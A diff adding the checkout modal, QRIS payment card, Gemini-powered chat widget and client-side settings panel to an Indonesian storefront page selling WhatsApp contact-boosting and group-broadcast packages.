+            <p id="footer-phone" class="text-[10px] text-cyan-400 font-semibold mt-1">6281277521737</p>
+        </footer>
+
+    </div>
+
+    <div id="checkout-modal" class="fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex items-end sm:items-center justify-center hidden opacity-0 transition-opacity duration-200">
+        <div class="w-full max-w-md bg-[#08101e] border-2 border-cyan-500/50 rounded-t-3xl sm:rounded-3xl max-h-[90vh] overflow-y-auto p-5 text-slate-100 space-y-4 shadow-[0_0_50px_rgba(0,210,255,0.3)] transform transition-transform duration-200 translate-y-4">
+
+            <div class="flex items-start justify-between pb-3 border-b border-cyan-500/30">
+                <div>
+                    <h3 class="text-lg font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-300 to-fuchsia-300">Checkout & Pembayaran</h3>
+                    <p id="modal-package-subtitle" class="text-xs text-cyan-300 font-bold mt-0.5">1 HARI · Rp 1.000</p>
+                </div>
+                <button onclick="closeCheckoutModal()" class="w-8 h-8 rounded-full bg-slate-800 flex items-center justify-center text-slate-300 hover:text-white font-bold border border-slate-700">
+                    ✕
+                </button>
+            </div>
+
+            <div class="space-y-3.5">
+                <div>
+                    <label class="block text-xs font-bold text-slate-200 mb-1.5">Nama</label>
+                    <input type="text" id="input-nama" placeholder="Masukkan nama Anda" class="w-full bg-slate-900 border border-cyan-500/40 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-cyan-400 transition">
+                </div>
+
+                <div>
+                    <label class="block text-xs font-bold text-slate-200 mb-1.5">Nomor WhatsApp</label>
+                    <input type="tel" id="input-wa" placeholder="08xxxxxxxxxx" class="w-full bg-slate-900 border border-cyan-500/40 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-cyan-400 transition">
+                </div>
+
+                <div>
+                    <label class="block text-xs font-bold text-slate-200 mb-1.5">Paket</label>
+                    <input type="text" id="input-paket" readonly class="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-sm text-cyan-300 font-bold">
+                </div>
+
+                <div>
+                    <label class="block text-xs font-bold text-slate-200 mb-1.5">Total</label>
+                    <input type="text" id="input-total" readonly class="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-sm text-amber-300 font-black">
+                </div>
+
+                <div class="flex items-center space-x-2.5 pt-1">
+                    <input type="checkbox" id="toggle-qris" checked onchange="toggleQrisVisibility()" class="w-4 h-4 rounded text-cyan-400 bg-slate-900 border-slate-700 focus:ring-0 cursor-pointer">
+                    <label for="toggle-qris" class="text-xs font-bold text-slate-200 cursor-pointer select-none">
+                        Tampilkan QRIS di checkout
+                    </label>
+                </div>
+            </div>
+
+            <div id="qris-checkout-card" class="bg-gradient-to-b from-slate-900 to-slate-950 border border-cyan-500/40 text-slate-100 rounded-2xl p-4 space-y-3 shadow-lg">
+                <div class="flex items-center justify-between border-b border-slate-800 pb-2">
+                    <span class="font-black text-xs text-cyan-300 tracking-wider uppercase">QRIS PEMBAYARAN RESMI</span>
+                    <span class="text-[10px] font-bold text-amber-300 uppercase">ALkizx4you Store</span>
+                </div>
+                <div class="flex justify-center my-2">
+                    <img id="qris-img-checkout" src="https://cdn.phototourl.com/free/2026-09-12-1e6cded4-b0de-4d0c-be73-ee0ce920a2a6.jpg" alt="QRIS ALkizx4you" class="w-full max-w-[280px] h-auto rounded-xl shadow-md border border-cyan-400/50 object-contain bg-white p-1" onerror="this.src='https://placehold.co/300x400/0c1a30/00d2ff?text=QRIS+Kizx4you'">
+                </div>
+                <div class="text-center text-[10px] text-slate-300 font-medium">
+                    Scan QRIS di atas menggunakan GoPay, OVO, Dana, ShopeePay, LinkAja, atau Mobile Banking Anda.
+                </div>
+            </div>
+
+            <button onclick="submitOrder()" class="w-full btn-gradient-cyan text-slate-950 font-black text-sm py-3 px-4 rounded-xl flex items-center justify-center space-x-2 active:scale-95 transition">
+                <span>Konfirmasi Pembayaran via WhatsApp</span>
+            </button>
+        </div>
+    </div>
+
+    <div id="ai-chat-modal" class="fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex items-end sm:items-center justify-center hidden opacity-0 transition-opacity duration-200">
+        <div class="w-full max-w-md bg-[#08101e] border-2 border-fuchsia-500/50 rounded-t-3xl sm:rounded-3xl h-[85vh] flex flex-col p-4 text-slate-100 shadow-[0_0_50px_rgba(217,70,239,0.3)] transform transition-transform duration-200 translate-y-4">
+
+            <div class="flex items-center justify-between pb-3 border-b border-fuchsia-500/30 flex-shrink-0">
+                <div class="flex items-center space-x-2">
+                    <div class="w-8 h-8 rounded-full bg-gradient-to-r from-fuchsia-500 to-cyan-400 flex items-center justify-center text-slate-950 font-black text-sm">✨</div>
+                    <div>
+                        <h3 class="text-sm font-black text-white">AI Joki Consultant</h3>
+                        <p class="text-[10px] text-fuchsia-300">Didukung oleh Gemini API</p>
+                    </div>
+                </div>
+                <button onclick="closeAiChatModal()" class="w-8 h-8 rounded-full bg-slate-800 flex items-center justify-center text-slate-300 hover:text-white font-bold border border-slate-700">
+                    ✕
+                </button>
+            </div>
+
+            <div id="ai-chat-messages" class="flex-1 overflow-y-auto py-3 space-y-3 text-xs pr-1">
+                <div class="flex items-start space-x-2">
+                    <div class="w-6 h-6 rounded-full bg-fuchsia-600 flex items-center justify-center flex-shrink-0 text-white font-bold text-[10px]">AI</div>
+                    <div class="bg-slate-900 border border-fuchsia-500/30 rounded-2xl px-3 py-2 text-slate-200 max-w-[85%] leading-relaxed">
+                        Halo! Saya asisten AI dari <b class="text-cyan-300">Kizx4you</b>. Ada yang bisa saya bantu terkait pemilihan paket joki kontak atau info tebar all GB?
+                    </div>
+                </div>
+            </div>
+
+            <div id="ai-typing" class="hidden text-[10px] text-fuchsia-400 italic py-1 animate-pulse">
+                AI sedang mengetik...
+            </div>
+
+            <div class="flex space-x-1.5 overflow-x-auto py-2 flex-shrink-0 no-scrollbar">
+                <button onclick="sendQuickPrompt('Paket apa yang paling recommended?')" class="bg-slate-900 border border-cyan-500/30 hover:border-cyan-400 text-cyan-300 px-2.5 py-1 rounded-full text-[10px] whitespace-nowrap transition">Rekomendasi Paket</button>
+                <button onclick="sendQuickPrompt('Apa itu tebar all GB?')" class="bg-slate-900 border border-fuchsia-500/30 hover:border-fuchsia-400 text-fuchsia-300 px-2.5 py-1 rounded-full text-[10px] whitespace-nowrap transition">Apa itu Tebar All GB?</button>
+            </div>
+
+            <div class="pt-2 border-t border-slate-800 flex items-center space-x-2 flex-shrink-0">
+                <input type="text" id="ai-user-input" placeholder="Tulis pertanyaan ke AI..." onkeydown="if(event.key==='Enter')sendAiMessage()" class="flex-1 bg-slate-900 border border-fuchsia-500/40 rounded-xl px-3.5 py-2.5 text-xs text-white focus:outline-none focus:border-fuchsia-400 transition">
+                <button onclick="sendAiMessage()" class="bg-gradient-to-r from-fuchsia-500 to-cyan-400 text-slate-950 font-black px-4 py-2.5 rounded-xl text-xs active:scale-95 transition">
+                    Kirim
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Admin Panel Modal -->
+    <div id="admin-panel" class="fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex items-center justify-center hidden p-4">
+        <div class="bg-slate-900 border-2 border-cyan-500/50 rounded-2xl p-5 w-full max-w-sm space-y-4 max-h-[90vh] overflow-y-auto shadow-2xl">
+            <div class="flex items-center justify-between border-b border-cyan-500/30 pb-2">
+                <h3 class="font-black text-white text-sm">Pengaturan Website</h3>
+                <button onclick="toggleAdminPanel()" class="text-slate-400 hover:text-white font-bold">✕</button>
+            </div>
+
+            <div class="space-y-3 text-xs">
+                <div>
+                    <label class="block text-slate-200 font-bold mb-1">Nomor WhatsApp Admin</label>
+                    <input type="text" id="admin-phone-input" value="https://wa.me/6281277521737" class="w-full bg-slate-950 border border-cyan-500/30 rounded-xl px-3 py-2 text-white">
+                </div>
+                <div>
+                    <label class="block text-slate-200 font-bold mb-1">URL Saluran Storan Joki</label>
+                    <input type="text" id="admin-channel-input" value="https://whatsapp.com/channel/0029VbDNXWG2phHDq6EG0X0j" class="w-full bg-slate-950 border border-cyan-500/30 rounded-xl px-3 py-2 text-white">
+                </div>
+                <div>
+                    <label class="block text-slate-200 font-bold mb-1">URL Saluran Testi Trx</label>
+                    <input type="text" id="admin-channel-testi-input" value="https://whatsapp.com/channel/0029VbBx1rMDjiOhLUDfGg32" class="w-full bg-slate-950 border border-cyan-500/30 rounded-xl px-3 py-2 text-white">
+                </div>
+                <div>
+                    <label class="block text-slate-200 font-bold mb-1">URL TikTok</label>
+                    <input type="text" id="admin-tiktok-input" value="https://www.tiktok.com/@trymanjb?" class="w-full bg-slate-950 border border-cyan-500/30 rounded-xl px-3 py-2 text-white">
+                </div>
+                <div>
+                    <label class="block text-slate-200 font-bold mb-1">URL Instagram</label>
+                    <input type="text" id="admin-instagram-input" value="https://www.instagram.com/trymanjb?" class="w-full bg-slate-950 border border-cyan-500/30 rounded-xl px-3 py-2 text-white">
+                </div>
+
+                <div class="border-t border-slate-800 pt-2">
+                    <label class="block text-slate-200 font-bold mb-1">URL Foto Banner Utama</label>
+                    <input type="text" id="admin-hero-input" placeholder="https://..." class="w-full bg-slate-950 border border-cyan-500/30 rounded-xl px-3 py-2 text-white">
+                </div>
+                <div>
+                    <label class="block text-slate-200 font-bold mb-1">URL Logo Header</label>
+                    <input type="text" id="admin-logo-input" placeholder="https://..." class="w-full bg-slate-950 border border-cyan-500/30 rounded-xl px-3 py-2 text-white">
+                </div>
+                <div>
+                    <label class="block text-slate-200 font-bold mb-1">URL Gambar QRIS</label>
+                    <input type="text" id="admin-qris-input" value="https://cdn.phototourl.com/free/2026-09-12-1e6cded4-b0de-4d0c-be73-ee0ce920a2a6.jpg" class="w-full bg-slate-950 border border-cyan-500/30 rounded-xl px-3 py-2 text-white">
+                </div>
+            </div>
+
+            <button onclick="saveAdminSettings()" class="w-full btn-gradient-cyan text-slate-950 font-black py-2.5 rounded-xl">
+                Simpan Perubahan Website
+            </button>
+        </div>
+    </div>
+
+    <script>
+        let config = {
+            adminPhone: "6281277521737",
+            channelUrl: "https://whatsapp.com/channel/0029VbE4PsDICVfeA4bAMu0e",
+            channelTestiUrl: "https://whatsapp.com/channel/0029Vb5kDO75K3zaIPQiGB3K",
+            merchantName: "ALkizx4you",
+            nmid: "ID1026486200102",
+            heroUrl: "https://cdn.phototourl.com/free/2026-09-12-1e6cded4-b0de-4d0c-be73-ee0ce920a2a6.jpg",
+            logoUrl: "https://cdn.phototourl.com/free/2026-09-12-1e6cded4-b0de-4d0c-be73-ee0ce920a2a6.jpg",
+            qrisUrl: "https://cdn.phototourl.com/free/2026-09-12-1e6cded4-b0de-4d0c-be73-ee0ce920a2a6.jpg",
+            tiktokUrl: "https://www.tiktok.com/@alkizx_store",
+            instagramUrl: "https://www.instagram.com/alkizx_store"
+        };
+
+        function updateLiveDateTime() {
+            const now = new Date();
+            const optionsDate = { weekday: 'short', day: 'numeric', month: 'short', year: 'numeric' };
+            const dateStr = now.toLocaleDateString('id-ID', optionsDate);
+            const timeStr = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+            const datetimeEl = document.getElementById('live-datetime');
+            if (datetimeEl) {
+                datetimeEl.innerText = `${dateStr} | ${timeStr}`;
+            }
+        }
+        setInterval(updateLiveDateTime, 1000);
+        window.onload = function() {
+            updateLiveDateTime();
+        };
+
+        let currentPackage = {
+            name: "1 HARI",
+            price: 1000
+        };
+
+        let chatHistoryGemini = [
+            {
+                role: "user",
+                parts: [{ text: "System Instruction: Anda adalah AI Consultant profesional untuk layanan 'Alkizx4you' (jasa joki kontak WhatsApp & tebar all GB terpercaya harga mulai Rp 1.000 hingga Rp 10.000 untuk paket VIP Permanen). Bersikaplah ramah, to the point, dan membantu pengguna memilih paket joki." }]
+            },
+            {
+                role: "model",
+                parts: [{ text: "Baik, saya siap membantu pelanggan ALkizx4you" }]
+            }
+        ];
+
+        function formatRupiah(amount) {
+            return "Rp " + amount.toLocaleString("id-ID");
+        }
+
+        function selectPackage(packageName, price) {
+            currentPackage.name = packageName;
+            currentPackage.price = price;
+
+            document.getElementById("modal-package-subtitle").innerText = `${packageName} · ${formatRupiah(price)}`;
+            document.getElementById("input-paket").value = packageName;
+            document.getElementById("input-total").value = formatRupiah(price);
+
+            openCheckoutModal();
+        }
+
+        function toggleFaq(id) {
+            const body = document.getElementById(`faq-body-${id}`);
+            const icon = document.getElementById(`faq-icon-${id}`);
+            if (body.classList.contains("hidden")) {
+                body.classList.remove("hidden");
+                icon.innerText = "-";
+            } else {
+                body.classList.add("hidden");
+                icon.innerText = "+";
+            }
+        }
+
+        function openCheckoutModal() {
+            const modal = document.getElementById("checkout-modal");
+            modal.classList.remove("hidden");
+            setTimeout(() => {
+                modal.classList.remove("opacity-0");
+                modal.querySelector("div").classList.remove("translate-y-4");
+            }, 10);
+        }
+
+        function closeCheckoutModal() {
+            const modal = document.getElementById("checkout-modal");
+            modal.classList.add("opacity-0");
+            modal.querySelector("div").classList.add("translate-y-4");
+            setTimeout(() => {
+                modal.classList.add("hidden");
+            }, 200);
+        }
+
+        function openAiChatModal() {
+            const modal = document.getElementById("ai-chat-modal");
+            modal.classList.remove("hidden");
+            setTimeout(() => {
+                modal.classList.remove("opacity-0");
+                modal.querySelector("div").classList.remove("translate-y-4");
+            }, 10);
+        }
+
+        function closeAiChatModal() {
+            const modal = document.getElementById("ai-chat-modal");
+            modal.classList.add("opacity-0");
+            modal.querySelector("div").classList.add("translate-y-4");
+            setTimeout(() => {
+                modal.classList.add("hidden");
+            }, 200);
+        }
+
+        function sendQuickPrompt(text) {
+            document.getElementById("ai-user-input").value = text;
+            sendAiMessage();
+        }
+
+        async function sendAiMessage() {
+            const inputEl = document.getElementById("ai-user-input");
+            const text = inputEl.value.trim();
+            if (!text) return;
+
+            inputEl.value = "";
+            appendChatMessage("user", text);
+            chatHistoryGemini.push({ role: "user", parts: [{ text: text }] });
+
+            document.getElementById("ai-typing").classList.remove("hidden");
+            scrollToBottomChat();
+
+            try {
+                const apiKey = "";
+                const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-3-flash-preview:generateContent?key=${apiKey}`;
+
+                const payload = {
+                    contents: chatHistoryGemini
+                };
+
+                let response = null;
+                let attempts = 0;
+                while (attempts < 3) {
+                    try {
+                        response = await fetch(apiUrl, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(payload)
+                        });
+                        if (response.ok) break;
+                    } catch (e) {}
+                    attempts++;
+                    await new Promise(r => setTimeout(r, 1000 * attempts));
+                }
+
+                if (!response || !response.ok) {
+                    throw new Error("Gagal terhubung ke Gemini API.");
+                }
+
+                const result = await response.json();
+                const candidate = result.candidates?.[0];
+                if (candidate && candidate.content?.parts?.[0]?.text) {
+                    const aiReply = candidate.content.parts[0].text;
+                    chatHistoryGemini.push({ role: "model", parts: [{ text: aiReply }] });
+                    appendChatMessage("ai", aiReply);
+                } else {
+                    appendChatMessage("ai", "Maaf, terjadi kesalahan saat merespons.");
+                }
+            } catch (err) {
+                appendChatMessage("ai", "Terjadi kendala jaringan saat menghubungi Gemini AI. Silakan coba lagi.");
+            } finally {
+                document.getElementById("ai-typing").classList.add("hidden");
+                scrollToBottomChat();
+            }
+        }
+
+        function appendChatMessage(sender, text) {
+            const container = document.getElementById("ai-chat-messages");
+            const div = document.createElement("div");
+            if (sender === "user") {
+                div.className = "flex items-start justify-end space-x-2";
+                div.innerHTML = `
+                    <div class="bg-cyan-600/90 text-white rounded-2xl px-3 py-2 max-w-[85%] leading-relaxed">${escapeHtml(text)}</div>
+                    <div class="w-6 h-6 rounded-full bg-cyan-500 flex items-center justify-center flex-shrink-0 text-slate-950 font-bold text-[10px]">U</div>
+                `;
+            } else {
+                div.className = "flex items-start space-x-2";
+                div.innerHTML = `
+                    <div class="w-6 h-6 rounded-full bg-fuchsia-600 flex items-center justify-center flex-shrink-0 text-white font-bold text-[10px]">AI</div>
+                    <div class="bg-slate-900 border border-fuchsia-500/30 rounded-2xl px-3 py-2 text-slate-200 max-w-[85%] leading-relaxed">${escapeHtml(text)}</div>
+                `;
+            }
+            container.appendChild(div);
+            scrollToBottomChat();
+        }
+
+        function scrollToBottomChat() {
+            const container = document.getElementById("ai-chat-messages");
+            container.scrollTop = container.scrollHeight;
+        }
+
+        function escapeHtml(text) {
+            return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+        }
+
+        function toggleQrisVisibility() {
+            const checkbox = document.getElementById("toggle-qris");
+            const qrisCard = document.getElementById("qris-checkout-card");
+            if (checkbox.checked) {
+                qrisCard.classList.remove("hidden");
+            } else {
+                qrisCard.classList.add("hidden");
+            }
+        }
+
+        function submitOrder() {
+            const nama = document.getElementById("input-nama").value.trim();
+            const wa = document.getElementById("input-wa").value.trim();
+
+            if (!nama) {
+                alertCustom("Mohon masukkan nama Anda terlebih dahulu.");
+                return;
+            }
+
+            if (!wa) {
+                alertCustom("Mohon masukkan nomor WhatsApp Anda.");
+                return;
+            }
+
+            const message = `Halo Admin ALkizx4you\n\nIzin konfirmasi pesanan:\n• Nama: ${nama}\n• No WhatsApp: ${wa}\n• Paket: ${currentPackage.name}\n• Total: ${formatRupiah(currentPackage.price)}\n• Status: Bayar via QRIS\n\nMohon segera diproses ya min!`;
+
+            const encodedMessage = encodeURIComponent(message);
+            let cleanPhone = config.adminPhone.replace(/\D/g, '');
+            if (cleanPhone.startsWith('0')) {
+                cleanPhone = '62' + cleanPhone.substring(1);
+            }
+            const waUrl = `https://wa.me/${cleanPhone}?text=${encodedMessage}`;
+
+            window.open(waUrl, '_blank');
+        }
+
+        function alertCustom(msg) {
+            const toast = document.createElement("div");
+            toast.className = "fixed top-5 left-1/2 -translate-x-1/2 bg-red-600 text-white font-bold text-xs px-4 py-3 rounded-xl shadow-2xl z-50 border border-red-400 transition transform duration-200";
+            toast.innerText = msg;
+            document.body.appendChild(toast);
+            setTimeout(() => {
+                toast.style.opacity = "0";
+                setTimeout(() => toast.remove(), 200);
+            }, 2500);
+        }
+
+        function toggleAdminPanel() {
+            const panel = document.getElementById("admin-panel");
+            panel.classList.toggle("hidden");
+            if (!panel.classList.contains("hidden")) {
+                document.getElementById("admin-phone-input").value = config.adminPhone;
+                document.getElementById("admin-channel-input").value = config.channelUrl;
+                document.getElementById("admin-channel-testi-input").value = config.channelTestiUrl;
+                document.getElementById("admin-tiktok-input").value = config.tiktokUrl;
+                document.getElementById("admin-instagram-input").value = config.instagramUrl;
+                document.getElementById("admin-hero-input").value = config.heroUrl;
+                document.getElementById("admin-logo-input").value = config.logoUrl;
+                document.getElementById("admin-qris-input").value = config.qrisUrl;
+            }
+        }
+
+        function saveAdminSettings() {
+            config.adminPhone = document.getElementById("admin-phone-input").value.trim();
+            config.channelUrl = document.getElementById("admin-channel-input").value.trim();
+            config.channelTestiUrl = document.getElementById("admin-channel-testi-input").value.trim();
+            config.tiktokUrl = document.getElementById("admin-tiktok-input").value.trim();
+            config.instagramUrl = document.getElementById("admin-instagram-input").value.trim();
+
+            const newHeroUrl = document.getElementById("admin-hero-input").value.trim();
+            const newLogoUrl = document.getElementById("admin-logo-input").value.trim();
+            const newQrisUrl = document.getElementById("admin-qris-input").value.trim();
+
+            if (newHeroUrl) {
+                config.heroUrl = newHeroUrl;
+                document.getElementById("hero-img").src = newHeroUrl;
+            }
+
+            if (newLogoUrl) {
+                config.logoUrl = newLogoUrl;
+                document.getElementById("header-logo-img").src = newLogoUrl;
+            }
+
+            if (newQrisUrl) {
+                config.qrisUrl = newQrisUrl;
+                document.getElementById("qris-img-checkout").src = newQrisUrl;
+            }
+
+            document.getElementById("sosmed-tiktok").href = config.tiktokUrl;
+            document.getElementById("sosmed-instagram").href = config.instagramUrl;
+            document.getElementById("sosmed-channel").href = config.channelUrl;
+            document.getElementById("sosmed-channel-testi").href = config.channelTestiUrl;
+
+            let targetPhone = config.adminPhone.replace(/\D/g, '');
+            if (targetPhone.startsWith('0')) targetPhone = '62' + targetPhone.substring(1);
+            document.getElementById("sosmed-wa").href = `https://wa.me/${targetPhone}`;
+
+            document.getElementById("footer-phone").innerText = config.adminPhone;
+
+            toggleAdminPanel();
+
+            const toast = document.createElement("div");
+            toast.className = "fixed top-5 left-1/2 -translate-x-1/2 bg-emerald-600 text-white font-bold text-xs px-4 py-3 rounded-xl shadow-2xl z-50 transition";
+            toast.innerText = "Pengaturan berhasil disimpan!";
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 2000);
+        }
+    </script>
 </body>
-</html>
+</html><script async src="/.netlify/scripts/hud?variant=public" data-nf-variant="public" data-netlify-site-id="bfa42950-3e88-4e4b-b086-2de98bd71109" data-app-host="app.netlify.com"></script>
